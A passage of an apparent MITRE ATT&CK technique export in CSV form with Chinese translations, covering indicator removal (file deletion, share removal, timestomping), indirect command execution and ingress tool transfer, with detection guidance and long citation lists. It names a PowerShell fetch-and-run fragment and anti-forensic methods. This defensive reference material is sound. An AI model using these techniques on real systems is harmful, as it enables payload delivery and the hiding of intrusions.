FireEye Hancitor),(Citation: ESET EvilNum July 2020),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Kaspersky StoneDrill 2017),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: objective-see windtail2 jan 2019),(Citation: Volexity PowerDuke November 2016),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Fysbis Dr Web Analysis),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Talos PoetRAT April 2020),(Citation: ESET OceanLotus macOS April 2019),(Citation: ESET Gelsemium June 2021),(Citation: jRAT Symantec Aug 2018),(Citation: alientvault macspy),(Citation: Leonardo Turla Penquin May 2020),(Citation: Fidelis Turbo),(Citation: ClearSky Siamesekitten August 2021),(Citation: Unit 42 NETWIRE April 2020),(Citation: CrowdStrike Putter Panda),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Symantec Linfo May 2012),(Citation: Gh0stRAT ATT March 2019),(Citation: FireEye Hacking Team),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye APT41 Aug 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: FireEye FELIXROOT July 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Unit 42 Hildegard Malware),(Citation: FireEye FIN7 Oct 2019),(Citation: Talos Cobalt Group July 2018),(Citation: CarbonBlack LockerGoga 2019),(Citation: XAgentOSX 2017),(Citation: Accenture Hogfish April 2018),(Citation: ClearSky Wilted Tulip July 2017),(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Trustwave GoldenSpy2 June 2020),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro Gamaredon April 2020),(Citation: Microsoft SIR Vol 21),(Citation: TechNet Del),(Citation: Securelist WhiteBear Aug 2017),(Citation: Citizen Lab Group5),(Citation: FireEye TRITON 2019),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Sophos SamSam Apr 2018),(Citation: Check Point Meteor Aug 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: Check Point Pay2Key November 2020),(Citation: ESET Gazer Aug 2017),",迹象移除/清除痕迹：文件删除,攻击者可能会删除其入侵活动留下的文件。恶意软件、工具或其他由对手在系统上丢弃或创建的非本地文件（例如：[Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)）可能会留下痕迹以表明是在网络内完成的以及如何完成的。这些文件的删除可以在入侵期间发生，或者作为入侵后过程的一部分，以最大限度地减少对手的足迹。主机操作系统提供了一些工具来执行清理，但攻击者也可能使用其他工具。（引用：Microsoft SDelete 2016 年 7 月）内置 [命令和脚本解释器]的示例（https://attack.mitre. org/techniques/T1059) 函数包括 Windows 上的 <code>del</code> 和 Linux 和 macOS 上的 <code>rm</code> 或 <code>unlink</code>。
T1070.005,Indicator Removal: Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use),https://attack.mitre.org/techniques/T1070/005,31 January 2020,09 February 2021,1.0,Defense Evasion,"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.",Windows,"Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, User Account: User Account Authentication",True,T1070,Host forensic analysis,,"Administrator, User",,Established network share connection to a remote system. Level of access depends on permissions of the account used.,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ESET InvisiMole June 2018),(Citation: Technet Net Use),(Citation: CarbonBlack RobbinHood May 2019),",迹象移除/清除痕迹：网络共享连接移除,攻击者可能会删除不再有用的共享连接以清理其操作痕迹。 Windows 共享驱动器和 [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) 连接可以在不再需要时删除。 [Net](https://attack.mitre.org/software/S0039) 是一个示例实用程序，可用于通过 <code>net use \\system\share /delete</code> 命令删除网络共享连接. （引用：Technet 网络使用）
T1070.006,Indicator Removal: Timestomp,"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.

Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",https://attack.mitre.org/techniques/T1070/006,31 January 2020,29 March 2020,1.0,Defense Evasion,Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.,"Linux, Windows, macOS","File: File Metadata, File: File Modification",True,T1070,Host forensic analysis,"Romain Dumont, ESET","root, SYSTEM, User",,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT32 May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Scarlet Mimic Jan 2016),(Citation: Crowdstrike Indrik November 2018),(Citation: McAfee Bankshot),(Citation: Fidelis Turbo),(Citation: Github PowerShell Empire),(Citation: ESET DazzleSpy Jan 2022),(Citation: ESET Turla PowerShell May 2019),(Citation: PWC KeyBoys Feb 2017),(Citation: 20 macOS Common Tools and Techniques),(Citation: CrowdStrike Putter Panda),(Citation: McAfee Shamoon December 2018),(Citation: Lotus Blossom Jun 2015),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: NCSC Cyclops Blink February 2022),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: ESET InvisiMole June 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye Periscope March 2018),(Citation: FireEye POSHSPY April 2017),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Dell TG-3390),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Anomali Rocke March 2019),(Citation: Novetta Winnti April 2015),(Citation: Novetta Blockbuster Loaders),(Citation: cobaltstrike manual),(Citation: Crowdstrike DNC June 2016),(Citation: Lee 2013),(Citation: ESET Kobalos Jan 2021),(Citation: Unit 42 PingPull Jun 2022),(Citation: Novetta Blockbuster),(Citation: Prevailion EvilNum May 2020),(Citation: Novetta-Axiom),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: McAfee GhostSecret),(Citation: FireEye TRITON 2019),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Novetta Blockbuster Destructive Malware),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: NCSC Joint Report Public Tools),(Citation: ESET Gazer Aug 2017),(Citation: Cylance Dust Storm),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET OceanLotus macOS April 2019),",迹象移除/清除痕迹：Timestamp,攻击者可能会修改文件时间属性以隐藏新文件或对现有文件的更改。 Timestomping 是一种修改文件时间戳（修改、访问、创建和更改时间）的技术，通常用于模拟同一文件夹中的文件。例如，在被对手修改或创建的文件上执行此操作，以使它们对法医调查人员或文件分析工具不显眼。 Timestomping 可以与文件名 [Masquerading](https://attack.mitre.org/techniques/T1036) 一起使用来隐藏恶意软件和工具。（引用：WindowsIR 反取证技术）
T1202,Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)

Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",https://attack.mitre.org/techniques/T1202,18 April 2018,05 May 2022,1.1,Defense Evasion,"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)",Windows,"Command: Command Execution, Process: Process Creation",False,,"Application Control, Static File Analysis","Matthew Demaske, Adaptforward",,,,,,,"(Citation: Cofense RevengeRAT Feb 2019),(Citation: VectorSec ForFiles Aug 2017),(Citation: Evi1cg Forfiles Nov 2017),(Citation: Qualys LolZarus),",间接命令执行,攻击者可能会滥用允许执行命令的实用程序来绕过限制命令行解释器使用的安全限制。可以使用各种 Windows 实用程序来执行命令，可能无需调用 [cmd](https://attack.mitre.org/software/S0106)。例如，[Forfiles](https://attack.mitre.org/software/S0193)、程序兼容性助手 (pcalua.exe)、适用于 Linux 的 Windows 子系统 (WSL) 的组件以及其他实用程序可能会调用从 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059)、运行窗口或通过脚本执行程序和命令。 （引用：VectorSec ForFiles 2017 年 8 月）（引用：Evi1cg Forfiles 2017 年 11 月）攻击者可能会滥用这些功能进行 [Defense Evasion]（https://attack.mitre.org/tactics/TA0005），特别是在破坏检测时执行任意执行和/或限制/防止使用 [cmd](https://attack.mitre.org/software/S0106) 或更常与恶意负载相关联的文件扩展名的缓解控制（例如组策略）。
T1105,Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)",https://attack.mitre.org/techniques/T1105,31 May 2017,20 May 2022,2.1,Command and Control,"Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS","File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,"John Page (aka hyp3rlinx), ApparitionSec",,,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: ESET Gamaredon June 2020),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET RTM Feb 2017),(Citation: Volexity OceanLotus Nov 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: ESET LoudMiner June 2019),(Citation: TrendMicro MacOS April 2018),(Citation: Symantec Remsec IOCs),(Citation: Kaspersky QakBot September 2021),(Citation: Bitdefender StrongPity June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Objective-See MacMa Nov 2021),(Citation: wardle evilquest partii),(Citation: FireEye Clandestine Fox),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT10 April 2017),(Citation: Symantec Hydraq Jan 2010),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Google EXOTIC LILY March 2022),(Citation: Deep Instinct TA505 Apr 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Crowdstrike Qakbot October 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: FireEye APT33 Sept 2017),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Threatpost Hancitor),(Citation: McAfee Sharpshooter December 2018),(Citation: CIRCL PlugX March 2013),(Citation: Unit 42 Valak July 2020),(Citation: 20 macOS Common Tools and Techniques),(Citation: Symantec Dragonfly),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub Sliver Upload),(Citation: Google TAG Lazarus Jan 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: Donut Github),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Trend Micro Qakbot December 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Aqua Kinsing April 2020),(Citation: BlackBerry Amadey 2020),(Citation: Check Point APT34 April 2021),(Citation: Symantec Chafer February 2018),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Talos ROKRAT),(Citation: Cylance Dust Storm),(Citation: McAfee Lazarus Jul 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Microsoft FTP),(Citation: Crowdstrike Indrik November 2018),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: PWC WellMess July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Check Point Warzone Feb 2020),(Citation: Lazarus APT January 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Symantec Wiarp May 2012),(Citation: Securelist MuddyWater Oct 2018),(Citation: Group IB APT 41 June 2021),(Citation: Linux FTP),(Citation: Unit42 Cannon Nov 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro njRAT 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: Novetta Blockbuster Loaders),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Securelist APT10 March 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: Fortinet Diavol July 2021),(Citation: Cybereason Egregor Nov 2020),(Citation: Volexity PowerDuke November 2016),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Intezer Doki July 20),(Citation: Rancor Unit42 June 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Forcepoint Felismus Mar 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Machete July 2019),(Citation: Microsoft POLONIUM June 2022),(Citation: Accenture Lyceum Targets November 2021),(Citation: Unit 42 SeaDuke 2015),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Dell TG-3390),(Citation: Microsoft WhisperGate January 2022),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: PaloAlto DNS Requests May 2016),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Juniper IcedID June 2020),(Citation: Check Point Meteor Aug 2021),(Citation: CISA WellMess July 2020),(Citation: Riskiq Remcos Jan 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Trend Micro Ransomware February 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Proofpoint Azorult July 2018),(Citation: Symantec Security Center Trojan.Kwampirs),(Citation: CISA SoreFang July 2016),(Citation: Kaspersky Adwind Feb 2016),(Citation: Intezer HiddenWasp Map 2019),(Citation: Aquino RARSTONE),(Citation: Talos Cobalt Strike September 2020),(Citation: TrendMicro Taidoor),(Citation: Securelist Octopus Oct 2018),(Citation: ClearSky Wilted Tulip July 2017),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Dell Sakula),(Citation: Cybereason Chaes Nov 2020),(Citation: Trusteer Carberp October 2010),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Talos Sodinokibi April 2019),(Citation: ESET ForSSHe December 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: IBM IcedID November 2017),(Citation: McAfee Night Dragon),(Citation: Malwarebytes Pony April 2016),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: FireEye Periscope March 2018),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: FireEye POSHSPY April 2017),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Github Koadic),(Citation: BiZone Lizar May 2021),(Citation: Prevx Carberp March 2011),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Talos Konni May 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Proofpoint ZeroT Feb 2017),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Symantec Dyre June 2015),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Symantec Pasam May 2012),(Citation: Cycraft Chimera April 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Korean FSI TA505 2020),(Citation: ESET EvilNum July 2020),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: SANS Conficker),(Citation: US-CERT Bankshot Dec 2017),(Citation: F-Secure The Dukes),(Citation: FireEye FIN7 March 2017),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Zscaler Bazar September 2020),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: CISA WellMail July 2020),(Citation: Microsoft DUBNIUM June 2016),(Citation: Lab52 WIRTE Apr 2019),(Citation: Lazarus RATANKBA),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: TrendMicro BlackTech June 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Gh0stRAT ATT March 2019),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: Securelist MiniDuke Feb 2013),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: Securelist ScarCruft May 2019),(Citation: Novetta-Axiom),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro Gamaredon April 2020),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: LOLBAS Esentutl),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ANSSI Sandworm January 2021),(Citation: ESET Gazer Aug 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 MechaFlounder March 2019),(Citation: FireEye Fin8 May 2016),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro Waterbear December 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: Lotus Blossom Dec 2015),(Citation: ESET Sednit Part 1),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: RATANKBA),(Citation: Symantec Whitefly March 2019),(Citation: JPCERT ChChes Feb 2017),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Group IB Ransomware September 2020),(Citation: Accenture Dragonfish Jan 2018),(Citation: Talos Micropsia June 2017),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Volexity Patchwork June 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: Unit42 BendyBear Feb 2021),(Citation: Unit42 Xbash Sept 2018),(Citation: Symantec Briba May 2012),(Citation: ESET LightNeuron May 2019),(Citation: Talos Seduploader Oct 2017),(Citation: Reaqta MuddyWater November 2017),(Citation: SecureWorks August 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Cybereason PowerLess February 2022),(Citation: Unit42 Redaman January 2019),(Citation: Fidelis INOCNATION),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: Microsoft PLATINUM June 2017),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Talos NavRAT May 2018),(Citation: Profero APT27 December 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: GitHub QuasarRAT),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Palo Alto OilRig May 2016),(Citation: ESET Industroyer),(Citation: Symantec Frutas Feb 2013),(Citation: Recorded Future REDDELTA July 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Medium Anchor DNS July 2020),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Talos Agent Tesla Oct 2018),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: ESET Exchange Mar 2021),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Elfin Mar 2019),(Citation: Unit42 BabyShark Apr 2019),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Unit 42 WhisperGate January 2022),(Citation: FireEye NETWIRE March 2019),(Citation: Intezer TeamTNT September 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Telebots Dec 2016),(Citation: FireEye SMOKEDHAM June 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye APT41 March 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Cybereason TA505 April 2019),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: ESET Gelsemium June 2021),(Citation: Symantec Calisto July 2018),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: jRAT Symantec Aug 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Talos Frankenstein June 2019),(Citation: Nccgroup Gh0st April 2018),(Citation: FireEye FiveHands April 2021),(Citation: FireEye FELIXROOT July 2018),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Talos PoetRAT October 2020),(Citation: ESET Attor Oct 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Cybereason Valak May 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: ESET Sednit Part 3),(Citation: TrendMicro PE_URSNIF.A2),(Citation: Trend Micro Tick November 2019),(Citation: NCSC APT29 July 2020),(Citation: ThreatExpert Agent.btz),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: CoinTicker 2019),(Citation: Microsoft BITSAdmin),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: Securelist Dropping Elephant),(Citation: Palo Alto DNS Requests),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Gigamon Berserk Bear October 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Symantec Vasport May 2012),(Citation: FireEye admin@338),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Forcepoint Monsoon),(Citation: Palo Alto menuPass Feb 2017),(Citation: NCSC Joint Report Public Tools),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: DOJ FIN7 Aug 2018),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: ESET TeleBots Oct 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: McAfee Gold Dragon),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye APT28),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Radware Micropsia July 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: NSA/FBI Drovorub August 2020),(Citation: Crowdstrike DNC June 2016),(Citation: Symantec Ristol May 2012),(Citation: Accenture MUDCARP March 2019),(Citation: Symantec Backdoor.Nidiran),(Citation: Cyble Sidewinder September 2020),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT TA18-074A),(Citation: Cisco H1N1 Part 2),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Microsoft PLATINUM April 2016),(Citation: LOLBAS Certutil),(Citation: Microsoft Actinium February 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Securelist ShadowPad Aug 2017),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Securelist 